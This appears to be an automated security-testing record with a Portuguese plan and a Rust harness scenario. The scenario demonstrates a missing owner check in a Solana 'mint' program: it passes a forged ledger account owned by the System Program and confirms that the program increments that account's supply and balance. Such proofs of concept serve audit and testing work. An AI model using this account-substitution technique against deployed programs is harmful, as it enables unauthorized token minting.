attempts.raw:
{
  "plan": "O programa `mint` (Pinocchio) recebe `accounts[0]` como `ledger` e le/grava bytes 40..56 sem verificar o owner. O baseline usa uma conta ledger legitima (dono = program_id) com supply/balance iniciais, provando que o cenario esta correto. O ataque substitui essa conta por uma conta forjada cujo owner e o atacante (System Program), com os mesmos bytes iniciais, e chama `mint` com o mesmo amount. O efeito medido e que a conta forjada teve supply/balance incrementados, demonstrando que o programa aceitou e modificou uma conta que nao lhe pertence.",
  "scenario": "let program_id = env.program_id;

// Conta ledger legitima: dono = program_id, com supply/balance iniciais nos offsets 40..56.
let mut legit_data = vec![0u8; 64];
legit_data[40..48].copy_from_slice(&100u64.to_le_bytes());
legit_data[48..56].copy_from_slice(&50u64.to_le_bytes());
let legit_ledger = account(&program_id, &legit_data, None);

// Conta forjada pelo atacante: dono = System Program (diferente do programa), mesmos bytes iniciais.
let mut forged_data = vec![0u8; 64];
forged_data[40..48].copy_from_slice(&100u64.to_le_bytes());
forged_data[48..56].copy_from_slice(&50u64.to_le_bytes());
let forged_ledger = account(&solana_sdk::system_program::id(), &forged_data, None);

let amount: u64 = 7;
let mut ix_data = vec![0u8]; // IX_MINT
ix_data.extend_from_slice(&amount.to_le_bytes());

// Baseline: uso legitimo com a conta do programa.
let ix_legit = env.raw_ix(&ix_data, &[AccountMeta::new(program_id, false)]);
let contas_legit = vec![(program_id, legit_ledger.clone())];
let r_base = env.baseline("mint legitimo na conta do programa", &ix_legit, &contas_legit);

// Ataque: mesma instrucao, mas accounts[0] e a conta forjada (owner diferente).
let ix_attack = env.raw_ix(&ix_data, &[AccountMeta::new(solana_sdk::system_program::id(), false)]);
let contas_attack = vec![(solana_sdk::system_program::id(), forged_ledger.clone())];
let r = env.attack("mint em conta forjada com owner do atacante", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let d = after(&r, &solana_sdk::system_program::id()).data();
    let supply = read_u64(d, 40);
    let balance = read_u64(d, 48);
    env.effect("supply da conta forjada foi incrementado pelo programa", supply == 107);
    env.effect("balance da conta forjada foi incrementado pelo programa", balance == 57);
}"
}

